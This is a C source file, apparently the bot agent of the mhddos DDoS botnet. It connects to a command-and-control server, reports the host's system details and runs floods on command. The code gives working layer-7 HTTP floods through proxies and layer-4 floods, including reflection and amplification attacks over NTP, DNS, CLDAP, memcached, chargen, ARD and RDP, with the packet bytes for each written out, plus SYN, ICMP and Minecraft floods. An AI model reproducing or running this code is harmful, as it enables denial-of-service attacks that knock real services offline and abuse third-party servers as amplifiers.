#include "mhddos.h"
#include <stdarg.h>
#include <sys/utsname.h>
#include <sys/wait.h>

#ifndef SERVER_HOST
#define SERVER_HOST "0.0.0.0"
#endif
#ifndef SERVER_PORT
#define SERVER_PORT 8443
#endif
#define RECONNECT_DELAY 5
#define CMD_BUF_SIZE 4096
#define MAX_ARGS 64

static volatile int g_child_pid = 0;
static volatile int g_attack_running = 0;
static int g_server_sock = -1;

static void get_arch_string(char *buf, int buflen) {
    struct utsname u;
    if (uname(&u) == 0) {
        snprintf(buf, buflen, "%s", u.machine);
    } else {
        snprintf(buf, buflen, "unknown");
    }
}

static void get_os_info(char *buf, int buflen) {
    struct utsname u;
    if (uname(&u) == 0) {
        snprintf(buf, buflen, "%s %s %s", u.sysname, u.release, u.machine);
    } else {
        snprintf(buf, buflen, "unknown");
    }
}

static int connect_to_server(const char *host, int port) {
    int sock;
    struct sockaddr_in addr;
    struct hostent *he;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, host, &addr.sin_addr) <= 0) {
        he = gethostbyname(host);
        if (!he) { close(sock); return -1; }
        memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    }

    struct timeval tv;
    tv.tv_sec = 10;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }

    tv.tv_sec = 120;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    int flag = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));

    return sock;
}

static int send_line(int sock, const char *fmt, ...) {
    char buf[CMD_BUF_SIZE];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n > 0) {
        buf[n] = '\n';
        n++;
        int sent = 0;
        while (sent < n) {
            int r = send(sock, buf + sent, n - sent, MSG_NOSIGNAL);
            if (r < 0) {
                if (errno == EINTR) continue;
                return -1;
            }
            if (r == 0) return -1;
            sent += r;
        }
    }
    return 0;
}

static int recv_line(int sock, char *buf, int buflen) {
    int pos = 0;
    while (pos < buflen - 1) {
        char c;
        int r = recv(sock, &c, 1, 0);
        if (r < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        if (r == 0) return -1;
        if (c == '\n') break;
        if (c != '\r') buf[pos++] = c;
    }
    buf[pos] = '\0';
    return pos;
}

static void stop_current_attack(void) {
    if (g_child_pid > 0) {
        kill(g_child_pid, SIGKILL);
        waitpid(g_child_pid, NULL, WNOHANG);
        g_child_pid = 0;
    }
    g_attack_running = 0;
}

static void sigchld_handler(int sig) {
    (void)sig;
    int status;
    pid_t p;
    while ((p = waitpid(-1, &status, WNOHANG)) > 0) {
        if (p == g_child_pid) {
            g_child_pid = 0;
            g_attack_running = 0;
        }
    }
}

static void run_attack_in_child(int argc, char **argv);

static void set_amp_payload(layer4_args_t *args, const uint8_t *payload, int len, int port) {
    memcpy(args->amp_payload, payload, len);
    args->amp_payload_len = len;
    args->amp_port = port;
}

static void execute_attack(int argc, char **argv) {
    if (argc < 2) return;

    char one[64];
    strncpy(one, argv[1], sizeof(one) - 1);
    one[sizeof(one) - 1] = '\0';
    for (int i = 0; one[i]; i++) one[i] = toupper((unsigned char)one[i]);

    if (strcmp(one, "STOP") == 0) {
        stop_current_attack();
        return;
    }

    method_t method = parse_method(one);
    if (method == METHOD_UNKNOWN) return;
    if (argc < 3) return;

    stop_current_attack();

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        if (g_server_sock >= 0) close(g_server_sock);
        signal(SIGCHLD, SIG_DFL);
        signal(SIGPIPE, SIG_DFL);
        run_attack_in_child(argc, argv);
        _exit(0);
    } else {
        g_child_pid = pid;
        g_attack_running = 1;
    }
}

static void run_attack_in_child(int argc, char **argv) {
    srand(time(NULL) ^ getpid());
    get_local_ip(g_local_ip, sizeof(g_local_ip));

    char one[64];
    strncpy(one, argv[1], sizeof(one) - 1);
    one[sizeof(one) - 1] = '\0';
    for (int i = 0; one[i]; i++) one[i] = toupper((unsigned char)one[i]);

    method_t method = parse_method(one);
    if (method == METHOD_UNKNOWN) _exit(1);

    volatile int running = 0;
    char urlraw[4096];
    memset(urlraw, 0, sizeof(urlraw));
    strncpy(urlraw, argv[2], sizeof(urlraw) - 1);
    {
        char *p = urlraw;
        while (*p && isspace((unsigned char)*p)) p++;
        if (strncmp(p, "http", 4) != 0) {
            char tmp[4096];
            snprintf(tmp, sizeof(tmp), "http://%s", p);
            strncpy(urlraw, tmp, sizeof(urlraw) - 1);
        }
    }

    if (is_layer7(method)) {
        if (argc < 8) _exit(1);

        url_t target;
        parse_url(urlraw, &target);

        char host_ip[256];
        if (strcmp(one, "TOR") != 0) {
            if (!resolve_host(target.host, host_ip, sizeof(host_ip))) _exit(1);
        } else {
            strncpy(host_ip, target.host, sizeof(host_ip));
        }

        int threads = atoi(argv[4]);
        int rpc = atoi(argv[6]);
        int timer = atoi(argv[7]);
        int proxy_ty = atoi(argv[3]);

        char proxy_path[512];
        snprintf(proxy_path, sizeof(proxy_path), "files/proxies/%s", argv[5]);

        char **useragents = NULL;
        int ua_count = load_lines("files/useragent.txt", &useragents, MAX_USERAGENTS);
        if (ua_count == 0) _exit(1);

        char **referers = NULL;
        int ref_count = load_lines("files/referers.txt", &referers, MAX_REFERERS);
        if (ref_count == 0) _exit(1);

        proxy_t *proxies = NULL;
        int proxy_count = 0;
        proxy_type_t pt = (proxy_type_t)proxy_ty;
        if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + (rand() % 3));
        if (pt != PROXY_NONE) {
            proxy_t *proxy_arr = malloc(sizeof(proxy_t) * MAX_PROXIES);
            if (proxy_arr) {
                proxy_count = load_proxies(proxy_path, proxy_arr, MAX_PROXIES, pt);
                if (proxy_count > 0) proxies = proxy_arr;
                else free(proxy_arr);
            }
        }

        pthread_t *tids = malloc(sizeof(pthread_t) * threads);
        layer7_args_t *thread_args = calloc(threads, sizeof(layer7_args_t));

        for (int i = 0; i < threads; i++) {
            thread_args[i].target = target;
            strncpy(thread_args[i].host_ip, host_ip, sizeof(thread_args[i].host_ip));
            thread_args[i].method = method;
            thread_args[i].rpc = rpc;
            thread_args[i].thread_id = i;
            thread_args[i].proxies = proxies;
            thread_args[i].proxy_count = proxy_count;
            thread_args[i].useragents = useragents;
            thread_args[i].useragent_count = ua_count;
            thread_args[i].referers = referers;
            thread_args[i].referer_count = ref_count;
            thread_args[i].running = &running;
            thread_args[i].use_ssl = (strcasecmp(target.scheme, "https") == 0);
            strncpy(thread_args[i].local_ip, g_local_ip, sizeof(thread_args[i].local_ip));
            pthread_create(&tids[i], NULL, layer7_thread, &thread_args[i]);
        }

        running = 1;
        time_t ts = time(NULL);
        while (time(NULL) < ts + timer) sleep(1);
        running = 0;
        sleep(1);
        free(thread_args);
        free(tids);
        if (proxies) free(proxies);

    } else if (is_layer4(method)) {
        if (argc < 5) _exit(1);

        url_t target;
        parse_url(urlraw, &target);

        char target_ip[256];
        if (!resolve_host(target.host, target_ip, sizeof(target_ip))) _exit(1);

        int port = target.port;
        if (port > 65535 || port < 1) _exit(1);

        if ((method == METHOD_NTP || method == METHOD_DNS_AMP || method == METHOD_RDP ||
             method == METHOD_CHAR || method == METHOD_MEM || method == METHOD_CLDAP ||
             method == METHOD_ARD || method == METHOD_SYN || method == METHOD_ICMP) &&
            !check_raw_socket()) _exit(1);

        int threads = atoi(argv[3]);
        int timer = atoi(argv[4]);
        proxy_t *proxies = NULL;
        int proxy_count = 0;
        char **refs = NULL;
        int ref_count = 0;

        if (!port) port = 80;

        if (argc >= 6) {
            char *argfive = argv[5];
            while (*argfive && isspace((unsigned char)*argfive)) argfive++;
            if (strlen(argfive) > 0) {
                if (method == METHOD_NTP || method == METHOD_DNS_AMP || method == METHOD_RDP ||
                    method == METHOD_CHAR || method == METHOD_MEM || method == METHOD_CLDAP ||
                    method == METHOD_ARD) {
                    char refl_path[512];
                    snprintf(refl_path, sizeof(refl_path), "files/%s", argfive);
                    FILE *rf = fopen(refl_path, "r");
                    if (!rf) _exit(1);
                    refs = malloc(sizeof(char*) * MAX_REFS);
                    char line[256];
                    while (fgets(line, sizeof(line), rf) && ref_count < MAX_REFS) {
                        line[strcspn(line, "\r\n")] = 0;
                        if (strlen(line) > 6) { refs[ref_count++] = strdup(line); }
                    }
                    fclose(rf);
                    if (ref_count == 0) _exit(1);
                } else {
                    int is_digit = 1;
                    for (int i = 0; argfive[i]; i++) if (!isdigit((unsigned char)argfive[i])) { is_digit = 0; break; }
                    if (is_digit && argc >= 7) {
                        int proxy_ty = atoi(argfive);
                        proxy_type_t pt = (proxy_type_t)proxy_ty;
                        if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + (rand() % 3));
                        char proxy_path[512];
                        snprintf(proxy_path, sizeof(proxy_path), "files/proxies/%s", argv[6]);
                        proxy_t *proxy_arr = malloc(sizeof(proxy_t) * MAX_PROXIES);
                        if (proxy_arr) {
                            proxy_count = load_proxies(proxy_path, proxy_arr, MAX_PROXIES, pt);
                            if (proxy_count > 0) proxies = proxy_arr;
                            else free(proxy_arr);
                        }
                        if (method != METHOD_MINECRAFT && method != METHOD_MCBOT &&
                            method != METHOD_TCP && method != METHOD_CPS && method != METHOD_CONNECTION) _exit(1);
                    }
                }
            }
        }

        int protocolid = MINECRAFT_DEFAULT_PROTOCOL;
        if (method == METHOD_MCBOT) {
            int probe = socket(AF_INET, SOCK_STREAM, 0);
            if (probe >= 0) {
                struct sockaddr_in addr;
                memset(&addr, 0, sizeof(addr));
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, target_ip, &addr.sin_addr);
                struct timeval tv = {2, 0};
                setsockopt(probe, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
                setsockopt(probe, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
                if (connect(probe, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
                    uint8_t hs[1024];
                    int hslen = mc_handshake(target_ip, port, protocolid, 1, hs);
                    send(probe, hs, hslen, 0);
                    uint8_t ping_pkt[16];
                    uint8_t zero = 0x00;
                    int pinglen = mc_data(&zero, 1, ping_pkt);
                    send(probe, ping_pkt, pinglen, 0);
                    uint8_t resp[1024];
                    int rlen = recv(probe, resp, sizeof(resp), 0);
                    if (rlen > 0) {
                        char *p = strstr((char*)resp, "\"protocol\":");
                        if (p) {
                            int pv = atoi(p + 11);
                            if (pv > 47 && pv < 758) protocolid = pv;
                        }
                    }
                }
                close(probe);
            }
        }

        pthread_t *tids = malloc(sizeof(pthread_t) * threads);
        layer4_args_t *thread_args = calloc(threads, sizeof(layer4_args_t));

        for (int i = 0; i < threads; i++) {
            strncpy(thread_args[i].target_ip, target_ip, sizeof(thread_args[i].target_ip));
            thread_args[i].target_port = port;
            thread_args[i].method = method;
            thread_args[i].protocolid = protocolid;
            thread_args[i].proxies = proxies;
            thread_args[i].proxy_count = proxy_count;
            thread_args[i].refs = refs;
            thread_args[i].ref_count = ref_count;
            thread_args[i].running = &running;
            strncpy(thread_args[i].local_ip, g_local_ip, sizeof(thread_args[i].local_ip));
            if (method == METHOD_ICMP) thread_args[i].target_port = 0;

            if (method == METHOD_RDP) {
                uint8_t p[] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
                set_amp_payload(&thread_args[i], p, 16, 3389);
            } else if (method == METHOD_CLDAP) {
                uint8_t p[] = {0x30,0x25,0x02,0x01,0x01,0x63,0x20,0x04,0x00,0x0a,0x01,0x00,0x0a,0x01,0x00,
                               0x02,0x01,0x00,0x02,0x01,0x00,0x01,0x01,0x00,0x87,0x0b,0x6f,0x62,0x6a,0x65,
                               0x63,0x74,0x63,0x6c,0x61,0x73,0x73,0x30,0x00};
                set_amp_payload(&thread_args[i], p, 39, 389);
            } else if (method == METHOD_MEM) {
                uint8_t p[] = {0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,'g','e','t','s',' ','p',' ','h',' ','e','\n'};
                set_amp_payload(&thread_args[i], p, 19, 11211);
            } else if (method == METHOD_CHAR) {
                uint8_t p[] = {0x01};
                set_amp_payload(&thread_args[i], p, 1, 19);
            } else if (method == METHOD_ARD) {
                uint8_t p[] = {0x00,0x14,0x00,0x00};
                set_amp_payload(&thread_args[i], p, 4, 3283);
            } else if (method == METHOD_NTP) {
                uint8_t p[] = {0x17,0x00,0x03,0x2a,0x00,0x00,0x00,0x00};
                set_amp_payload(&thread_args[i], p, 8, 123);
            } else if (method == METHOD_DNS_AMP) {
                uint8_t p[] = {0x45,0x67,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x02,0x73,0x6c,
                               0x00,0x00,0xff,0x00,0x01,0x00,0x00,0x29,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00};
                set_amp_payload(&thread_args[i], p, 31, 53);
            }
            pthread_create(&tids[i], NULL, layer4_thread, &thread_args[i]);
        }

        running = 1;
        time_t ts = time(NULL);
        while (time(NULL) < ts + timer) sleep(1);
        running = 0;
        sleep(1);
        free(thread_args);
        free(tids);
        if (proxies) free(proxies);
    }
}

static void handle_command(const char *cmd_line) {
    if (!cmd_line || strlen(cmd_line) == 0) return;

    char buf[CMD_BUF_SIZE];
    strncpy(buf, cmd_line, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    char *args[MAX_ARGS];
    int argc = 0;
    args[argc++] = "mhddos";

    char *p = buf;
    while (*p && argc < MAX_ARGS) {
        while (*p && isspace((unsigned char)*p)) p++;
        if (!*p) break;
        args[argc++] = p;
        while (*p && !isspace((unsigned char)*p)) p++;
        if (*p) *p++ = '\0';
    }

    if (argc < 2) return;
    execute_attack(argc, args);
}

int main(int argc, char *argv[]) {
    (void)argc;
    (void)argv;

    const char *server_host = SERVER_HOST;
    int server_port = SERVER_PORT;

    if (argc >= 2) server_host = argv[1];
    if (argc >= 3) server_port = atoi(argv[2]);

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigchld_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
    sigaction(SIGCHLD, &sa, NULL);
    signal(SIGPIPE, SIG_IGN);

    srand(time(NULL) ^ getpid());
    get_local_ip(g_local_ip, sizeof(g_local_ip));

    char arch[64];
    char osinfo[256];
    get_arch_string(arch, sizeof(arch));
    get_os_info(osinfo, sizeof(osinfo));

    while (1) {
        int sock = connect_to_server(server_host, server_port);
        g_server_sock = sock;
        if (sock < 0) {
            sleep(RECONNECT_DELAY);
            continue;
        }

        if (send_line(sock, "HELLO|%s|%s|%s", arch, osinfo, g_local_ip) < 0) {
            close(sock);
            sleep(RECONNECT_DELAY);
            continue;
        }

        while (1) {
            char cmd[CMD_BUF_SIZE];
            int n = recv_line(sock, cmd, sizeof(cmd));
            if (n < 0) break;
            if (n == 0) continue;

            if (strcmp(cmd, "PING") == 0) {
                if (send_line(sock, "PONG|%s|%d", arch, g_attack_running ? 1 : 0) < 0) break;
                continue;
            }

            if (strcmp(cmd, "STOP") == 0) {
                stop_current_attack();
                send_line(sock, "STATUS|stopped");
                continue;
            }

            if (strncmp(cmd, "ATTACK|", 7) == 0) {
                char *attack_cmd = cmd + 7;
                handle_command(attack_cmd);
                send_line(sock, "STATUS|attacking");
                continue;
            }

            handle_command(cmd);
        }

        close(sock);
        stop_current_attack();
        sleep(RECONNECT_DELAY);
    }

    return 0;
}
